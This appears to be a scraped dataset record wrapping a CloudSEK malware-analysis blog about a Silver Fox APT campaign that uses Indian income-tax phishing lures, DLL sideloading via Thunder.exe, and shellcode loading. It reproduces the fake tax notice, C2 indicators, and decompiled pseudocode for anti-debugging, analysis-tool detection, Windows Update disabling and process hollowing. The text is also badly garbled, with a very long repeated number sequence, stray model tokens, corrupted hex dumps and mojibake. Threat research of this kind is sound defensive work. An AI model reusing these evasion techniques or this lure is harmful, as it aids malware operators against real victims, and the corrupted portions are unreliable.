Attachment</td></tr></table>\n\n<--- Page Split --->\n\n\n<table><tr><td>Indicator<br>Type</td><td>Indicator</td><td>Comments</td></tr><tr><td>Domain</td><td>b[.]yuxuanow[.]top</td><td>Shellcode C2</td></tr><tr><td>IP</td><td>45.207.231[.]94</td><td>Resolution from<br>ggwk[.]cc</td></tr><tr><td>IP</td><td>103.20.195[.]147</td><td>Resolution from<br>b[.]yuxuanow[.]top</td></tr></table>", "format_code": "v4=IsDebuggerPresent();if(v4){LogStatus((char*)&Format_2);return0;}", "hash": "hash"}
{"file_name": "fed9c11a-b86a-49a9-a9e2-24332f01a81c.md", "title": "Silver Fox Targeting India Using Tax Themed Phishing Lures", "malicious_code": "v9 = wcscmp(pe.szExeFile, L\"ida.exe\");\nif (!v9)\nLogStatus((char *)&Format_4, pe.th32ProcessID);\nv10 = wcscmp(pe.szExeFile, L\"x64dbg.exe\");\nif (!v10)\nLogStatus((char *)&Format_5, pe.th32ProcessID);\n}\nwhile ( Process32Nextw(Toolhelp32Snapshot, &pe) );", "describe": "cloudsek.com/blog/silver- fox- targeting- india- using- tax- themed- phishing- lures  \n\nPrajwal Awasthi  \n\nTable of Content  \n\nSubscribe to CloudSEK Resources  \n\nGet the latest industry news, threats and resources.  \n\n## Executive Summary  \n\nCloudSEK's TRIAD discovered a campaign by Silver Fox APT targeting India with Income tax themed phishing lures. The lure is visually identical to the ones discovered by other vendors, however, this campaign has not been attributed to a specific threat actor before this report. Attribution accuracy is critical to threat intelligence; it enables defenders to predict adversary behavior and deploy targeted countermeasures. Misattribution from trusted sources propagates through threat feeds and detection systems, causing organizations to focus on the wrong threat while the actual adversary operates undetected. Attributing this campaign to SideWinder APT (India- aligned) contradicts basic victimology and creates systemic confusion. Using our report aims to highlight the sophisticated kill chain by the Chinese APT group, and explains the rationale behind CloudSEK's attribution.  \n\n## Kill Chain  \n\n<｜end▁of▁sentence｜>\n  \n\n## Initial Access Vector  \n\nTOPSOE INDIA PRIVATE LIMITED \n\n \n\nस्वरोचन ने अधिकार - Allgate/1/6/6/6/6/6/6/6/6/6/6/1/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/\n  \n\nMalicious email  \n\nWe found an interesting email uploaded from India with just an attachment called \"TOPsoE India Private Limited\". The pdf looked like an official Income Tax Department document. Upon clicking on the pdf, \"ggwk[.]cc\" opens up on the browser and a zip file called \"tax affairs.exe\" is downloaded.\n\n<--- Page Split --->\n\nNo. TAX/PEN/2025-142 \n\nभारत सरकार / Government of India\nवित्त मंत्रालय / Ministry of Finance\nआयकर विभाग / Income Tax Department\nप्रवर्तन प्रभाग / Enforcement Division \n\nAayakar Bhavan,\nNew Delhi - 110001 \n\nOFFICE MEMORANDUM \n\nSub: कर अनुपालन की कमी और दंड सूचना / Tax Compliance Deficiency and Penalty Notice \n\n1. आपकी कमनी की कर निरीक्षण के दौरान आयकर अधिनियम, 1961 की धारा 271(1)(c) के तहत कर संबंधी अनियमिताएं पाई गई हैं। The tax inspection of your company has revealed irregularities under Section 271(1)(c) of the Income Tax Act, 1961. \n\n2. इस सूचना की प्राप्ति के 72 घंटे (3 दिन) के भीतर निम्नलिखित दस्तावेज आयकर विभाग को प्रस्तुत करना अनिवार्य है। It is mandatory to submit the following documents to the Income Tax Department within 72 hours (3 days) of receipt of this notice. \n\nआवश्यक दस्तावेज सूची / Required Documents List\nनीचे दिए गए लिंक से दस्तावेज डाउनलोड करें / Download documents from the link below \n\nदस्तावेज डाउनलोड करें / Download Documents \n\n3. निर्धारित समयावधि में दस्तावेज प्रस्तुत न करने पर आयकर अधिनियम की धारा 276C के तहत कानूनी कार्रवाई की जाएगी। Legal action will be taken under Section 276C of the Income Tax Act if documents are not submitted within the stipulated time. \n\n(राज कुमार शर्मा) \n\nRaj Kumar Sharma \n\nसहायक आयकर आयुक्त \n\nAssistant Commissioner of Income Tax \n\nTechnical Analysis \n\nStage - 1: Tax Affairs.zip \n\nPE32 \n\nOperation system: Windows(2000)[1386, 32-bit, GUI] \n\nLinker: Microsoft Linker(10.00.40219) \n\nCompiler: Microsoft Visual C/C++(16.00.40219)[C] \n\nLanguage: C \n\nTool: Visual Studio(2010) \n\n(Heur) Packer: Compressed or packed data[Strange overlay] \n\nInstaller: Nullsoft Scriptable Install System(2.46.5-ANSI) \n\nOverlay: Binary[Offset=0x00034c00,Size=0x002a2e40] \n\nUnknown: Unknown \n\nDetect It Easy \n\nUsing static analysis we see that the given PE file is a 32 bit GUI binary. More importantly, the file is identified as a Nullsoft Scriptable Install system (NSIS) installer. NSIS installers embed their installation script, compressed payloads etc inside the binary itself and we can move ahead to analyse it as an installer driven staging payload.\n\n<--- Page Split --->\nGetTempPathA(0x10000u, PathName); \n\nif ( sub_4032CB() || (GetWindowsDirectoryA(PathName, 0xFFBu), lstrcatA(PathName, \"\\Temp\"), sub_4032CB()) \n\nDeleteFileA(FileName); \n\nError_writing_temporary_file._Make_sure_your_temp_folder_is_val = (const char *)sub_403030(Buffer); \n\nif (!Error_writing_temporary_file._Make_sure_your_temp_folder_is_val ) \n\nif (!dword_433C24 ) \n\n{ \n\nABEL_34: \n\nuExitCode = -1; \n\nuExitCode = sub_4052E6(); \n\ngoto LABEL_35; \n\n} \n\nfor ( i = (CHAR *)sub_40567B(&sz, 0); i >= &sz && sub_4032FF(i, \"_=\", 4); --i ) \n\n; \n\nError_writing_temporary_file._Make_sure_your_temp_folder_is_val = \"Error launching installer\"; \n\nif ( i >= &sz ) \n\n{ \n\n* i = 0; \n\nlpString2_3 = i + 4; \n\nif ( !sub_405EFC(lpString2_3) ) \n\ngoto LABEL_35; \n\nlstrcpyAn_wrp(&lpString1_, lpString2_3); \n\nlstrcpyAn_wrp(Directory, lpString2_3); \n\nError_writing_temporary_file._Make_sure_your_temp_folder_is_val = 0; \n\ngoto LABEL_34; \n\n} \n\nlstrcatA(PathName, \"\\nsu.tmp\"); \n\nif ( lstrcmpiA(PathName, ::lpString2) ) \n\n{ \n\nCreateDirectoryA(PathName, 0); \n\nSetCurrentDirectoryA(PathName); \n\nif ( !lpString1_ ) \n\nlstrcpyAn_wrp(&lpString1_, ::lpString2); \n\nlstrcpyAn_wrp(lpString1_, lpString2); \n\nlstrcpyAn_wrp(&lpString1_0, \"A\"); \n\nn26 = 26;<｜end▁of▁sentence｜>\n\n<center>NSIS Installer </center>  \n\nThe NSIS installer begins by resolving a writable temporary directory using GetTempPathA. If the operation fails, it falls back to C:\\Windows\\Temp, ensuring execution reliability. Once a valid location is identified, the installer creates an NSIS specific working directory (\\~nsu.tmp) and switches the directory to it.  \n\nDropped Files   \n\n<table><tr><td>ndoe &amp;gt; AppData &amp;gt; Local &amp;gt; Temp</td><td></td><td></td><td></td></tr><tr><td>Name</td><td>Date modified</td><td>Type</td><td>Size</td></tr><tr><td>Thunder.exe</td><td>7/24/2024 10:42 PM</td><td>Application</td><td>635 KB</td></tr><tr><td>FastAnimation.dll</td><td>5/27/2025 4:38 AM</td><td>Application extens...</td><td>578 KB</td></tr><tr><td>leakrepair.dll</td><td>5/27/2025 4:40 AM</td><td>Application extens...</td><td>716 KB</td></tr><tr><td>dynlbase.dll</td><td>5/27/2025 4:48 AM</td><td>Application extens...</td><td>1,431 KB</td></tr><tr><td>libaw.dat</td><td>5/27/2025 4:59 AM</td><td>DAT File</td><td>1,121 KB</td></tr><tr><td>DumpUper.ini</td><td>5/27/2025 5:01 AM</td><td>Configuration setti...</td><td>2 KB</td></tr><tr><td>libdefa.dat</td><td>9/16/2025 7:38 AM</td><td>DAT File</td><td>321 KB</td></tr><tr><td>box.ini</td><td>9/25/2025 8:00 PM</td><td>Configuration setti...</td><td>126 KB</td></tr><tr><td>libexpat.dll</td><td>9/25/2025 8:13 PM</td><td>Application extens...</td><td>32 KB</td></tr></table>  \n\nUpon analysis we found that only 2 files are of use to us, Thunder.exe and libexpat.dll. Thunder.exe is a legitimate, digitally signed executable developed by Xunlei (迅雷), commonly distributed as part of the Thunder download manager ecosystem. In this infection chain, the binary itself is not malicious but is abused as a DLL hijacking host. When executed from installer's temporary directory, Thunder.exe loads libexpat.dll from its local path due to default DLL search order. We can confirm this in x64dbg.\n\n<--- Page Split --->\npos: 0%\n\npush eax\n\njmp tax affairs.402008\n\npush F\n\ncall tax affairs.405A65\n\npush 64\n\npush dword ptr ss:[ebp+8]\n\ncall esi\n\ncmp eax,102\n\nje tax affairs.401FFC\n\nlea eax,dword ptr ss:[ebp-8]\n\npush eax\n\npush dword ptr ss:[ebp+8]\n\ncall dword ptr ds:[<GetExitCodeProcess>]\n\ncmp dword ptr ss:[ebp-20],ebx\n\njl tax affairs.40202E\n\npush dword ptr ss:[ebp-8]\n\npush edi\n\ncall tax affairs.40589E\n\njmp tax affairs.40203A\n\ncmp dword ptr ss:[ebp-8],ebx\n\nje tax affairs.40203A\n\nmov dword ptr ss:[ebp-4],1\n\npush dword ptr ss:[ebp+8]<｜end▁of▁sentence｜>\n\n<center>DLL Loading </center>  \n\n## Stage - 2 : libexpat.dll  \n\nThe dropped libexpat.dll does not export any meaningful functions and is never explicitly invoked by Thunder.exe.The dll relies on the windows loader functionality and calls the DLLMain. This callback is invoked unconditionally, regardless of whether the DLL exports any functions or is actively used by the host process.  \n\nLet's take a look at the working of the DLL.  \n\nv4 = IsDebuggerPresent(); \n\nv5 = &unk_100056DC; \n\nif (!v4) \n\nv5 = &unk_100056E4; \n\nLogStatus((char *)&Format_1, v5); \n\nif (v4) \n\n{ \n\nLogStatus((char *)&Format_2); \n\nreturn 0; \n\n} \n\nelse if (CheckSystemResources()) \n\nGetSystemInfo(&SystemInfo); \n\ndwNumberOfProcessors = SystemInfo.dwNumberOfProcessors; \n\nv7 = &unk_1000560C; \n\nif ( SystemInfo.dwNumberOfProcessors < 4 ) \n\nv7 = &unk_10005614; \n\nLogStatus(aCpu, SystemInfo.dwNumberOfProcessors, v7); \n\nif ( dwNumberOfProcessors >= 4 ) \n\n{ \n\nif (!(unsigned __int8)Persistence()) \n\nLogStatus((char *)&Format_3); \n\nToolHelp32Snapshot = CreateToolhelp32Snapshot(2u, 0); \n\nif ( ToolHelp32Snapshot != (HANDLE)-1 ) \n\n{ \n\npe.dwSize = 556; \n\nif ( Process32Firstw(Toolhelp32Snapshot, &pe) ) \n\n{ \n\ndo \n\n{ \n\nv9 = wcscmp(pe.szExeFile, L\"ida.exe\"); \n\nif ( v9 ) \n\nv9 = v9 < 0 ? -1 : 1; \n\nif (!v9 ) \n\nLogStatus((char *)&Format_4, pe.th32ProcessID); \n\nv10 = wcscmp(pe.szExeFile, L\"x64dbg.exe\"); \n\nif ( v10 ) \n\nv10 = v10 < 0 ? -1 : 1; \n\nif (!v10 ) \n\nLogStatus((char *)&Format_5, pe.th32ProcessID); \n\n} \n\nwhile ( Process32Nextw(Toolhelp32Snapshot, &pe) );<｜end▁of▁sentence｜>\n\n\n<--- Page Split --->\n\nThe Main function begins by many anti debugging and sandbox techniques.The DLL performs process enumeration and scans the process list for common analysis and sandbox tools. Also the DLL queries for the system resources checking if minimum requirements are satisfied or not. In addition to that, if it detects any sandbox environment, it terminates the malware.  \n\nif (!DisableWindowsUpdateService() ) \n\nLogStatus((char *)&Format_6); \n\nBlock[0] = 0; \n\nBlock[1] = 0; \n\nv17 = 0; \n\nv18 = 0; \n\nif ( LoadAndDecryptPayload(Block) ) \n\nv11 = ProcessHollowing((int)Block); \n\nFormat = (char *)&unk_100059C0; \n\nif ( v11 ) \n\nFormat = (char *)&byte_100059CC; \n\n} \n\nelse \n\n} \n\nFormat = (char *)&unk_100059E0; \n\n} \n\nLogStatus(Format); \n\nDisableThreadLibraryCalls(hinstDLL); \n\nCreateThread(0, 0, StartAddress, 0, 0, 0); \n\nv13 = Block[0]; \n\nif ( Block[0] ) \n\n} \n\nif ( v17 - (unsigned int)Block[0] >= 0x1000 ) \n\nv13 = (void *)*((_DWORD *)Block[0] - 1); \n\nif ( (unsigned int)((char *)Block[0] - (char *)v13 - 4) > 0x1F ) \n\ninvalid_parameter_noinfo_noreturn(); \n\n} \n\nsub_10003E6E(v13);<｜end▁of▁sentence｜>\n\n<center>Payload Decryption </center>  \n\nOnce the DLL completes its anti analysis checks, it enters the core execution logic. It first disables the Windows Update service(wuauserv) then loads an encrypted payload from the disk. The payload is dynamically resolved and loads the box.ini file from the temporary directory. The file is fully read into memory, decrypted using embedded cryptographic constants and later on executed as shellcode.  \n\n<table><tr><td>00</td><td>01</td><td>02</td><td>03</td><td>04</td><td>05</td><td>06</td><td>07</td><td>08</td><td>09</td><td>OA</td><td>OB</td><td>OC</td><td>OD</td><td>OE</td><td>OF</td></tr><tr><td>9B</td><td>80</td><td>9D</td><td>8E</td><td>89</td><td>C3</td><td>23</td><td>6B</td><td>A6</td><td>95</td><td>C5</td><td>FC</td><td>B7</td><td>2A</td><td>CB</td><td>OD</td></tr><tr><td>D4</td><td>CF</td><td>6B</td><td>FF</td><td>F8</td><td>6F</td><td>AC</td><td>9C</td><td>D8</td><td>94</td><td>6A</td><td>50</td><td>32</td><td>F0</td><td>B1</td><td>FC</td></tr><tr><td>E1</td><td>29</td><td>25</td><td>0D</td><td>5A</td><td>2A</td><td>E7</td><td>A3</td><td>4C</td><td>7B</td><td>54</td><td>A1</td><td>F7</td><td>2B</td><td>4E</td><td>60</td></tr><tr><td>14</td><td>CF</td><td>71</td><td>43</td><td>65</td><td>4B</td><td>B3</td><td>12</td><td>80</td><td>73</td><td>54</td><td>F5</td><td>A4</td><td>0B</td><td>ED</td><td>71</td></tr><tr><td>A6</td><td>6B</td><td>6B</td><td>5C</td><td>0D</td><td>6F</td><td>57</td><td>F0</td><td>F8</td><td>C3</td><td>F6</td><td>15</td><td>F2</td><td>8F</td><td>81</td><td>EB</td></tr><tr><td>6C</td><td>18</td><td>A0</td><td>F4</td><td>DB</td><td>9F</td><td>47</td><td>00</td><td>8C</td><td>A7</td><td>CE</td><td>0E</td><td>EB</td><td>92</td><td>CF</td><td>89</td></tr><tr><td>83</td><td>87</td><td>D0</td><td>70</td><td>D4</td><td>C9</td><td>42</td><td>64</td><td>BF</td><td>78</td><td>8D</td><td>C5</td><td>84</td><td>93</td><td>9B</td><td>90</td></tr><tr><td>74</td><td>BA</td><td>DE</td><td>B5</td><td>E8</td><td>A1</td><td>86</td><td>44</td><td>CC</td><td>AD</td><td>C3</td><td>C0</td><td>7C</td><td>A1</td><td>94</td><td>6F</td></tr><tr><td>54</td><td>62</td><td>72</td><td>F8</td><td>9F</td><td>6F</td><td>C4</td><td>R9</td><td>07</td><td>19</td><td>1D</td><td>F7</td><td>6F</td><td>17</td><td>DN</td><td>8F</td></tr></table>\n\nDecoded text \n\n\"E.ZNA#k!·Aü·*E.\nÖİkyoo-oeo\"jP2&tü\ná)%.Z*ç£L(Tj÷+N'\n.İqCeK°.eStÖn.iq\n!kk\\.ow&oAö.ö..ë\n1. öÜYG.ÇSİ.ë'İn\nf#DpÖÉBdžx.Ä„“>.\nt°Pue;tDİ.ÄÄ|;\"o\nThræšnÄi...-n.ÝÝ<｜end▁of▁sentence｜>\n\n\n<--- Page Split --->\nStartupInfo.dwFlags = STARTF_USESHOWWINDOW; \n\nmemset(&StartupInfo.wShowWindow, 0, 20); \n\nif ( GetFileAttributesA(\"C:\\\\Windows\\\\SysWOW64\\\\explorer.exe\") == -1 ) \n\nLastError = GetLastError(); \n\nLogStatus((char *)&Format_17, \"C:\\\\Windows\\\\SysWOW64\\\\explorer.exe\", LastError); return 0; \n\nif (!CreateProcessA( 